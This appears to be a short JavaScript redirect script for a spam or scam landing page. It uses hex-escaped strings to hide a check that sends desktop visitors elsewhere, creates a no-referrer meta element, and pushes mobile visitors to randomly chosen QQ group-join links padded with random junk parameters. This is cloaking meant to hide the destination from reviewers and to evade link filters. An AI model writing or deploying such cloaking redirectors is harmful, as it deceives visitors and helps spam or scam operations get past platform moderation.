
const meta = document.createElement('meta')
meta.setAttribute('name', 'referrer')
meta.setAttribute('content', 'no-referrer')


function aaa1(){if((/^(Win|Mac)/i['\x74\x65\x73\x74'](navigator['\x70\x6c\x61\x74\x66\x6f\x72\x6d'])||!/mobile|Android|phone|iPhone|iPod|ios|iPad/i['\x74\x65\x73\x74'](navigator['\x75\x73\x65\x72\x41\x67\x65\x6e\x74']))&&(!localStorage['\x69\x73\x43\x68\x65\x6e\x65\x79']||window["\x70\x61\x72\x73\x65\x49\x6e\x74"](conf['\x6d\x6f\x62\x69\x6c\x65']))){location='\x32\x30\x32\x31\x30\x35\x32\x39\x31\x30\x33\x32\x33\x33\x34\x36\x35\x38\x33\x39\x32\x37'}};aaa1();




var urls=[

   'http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=9iqmUbkRX18dQXbm8qBYUAr2j74h_3GP&{nnnnnnnnnn}{wwwwwwwww}',
   'http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=SfuZBggSaJIcIpmYaF_kfMX3-Wb59yzL&{nnnnnnnnnn}{wwwwwwwww}',
   'http://qm.qq.com/cgi-bin/qm/qr?_wv=1027&k=kBF19na4P-Yzm5hN9M9qSQr9v3cnqzfA&{nnnnnnnnnn}{wwwwwwwww}',
   
];
location.href = myEeplace(urls[Math.floor(Math.random()*urls.length)]);
function myEeplace(s){
	return s.replace(/\{(\w+?)\}/g,function(a,b){
		var h='';
		for(var i=0;i<b.length;i++){
			if('n'==b[i]){
				h+=Math.floor(Math.random()*10);
			}else if('w'==b[i]){
				h+=String.fromCharCode(97+Math.floor(Math.random()*26));
			}
		}
		return h;
	});
}
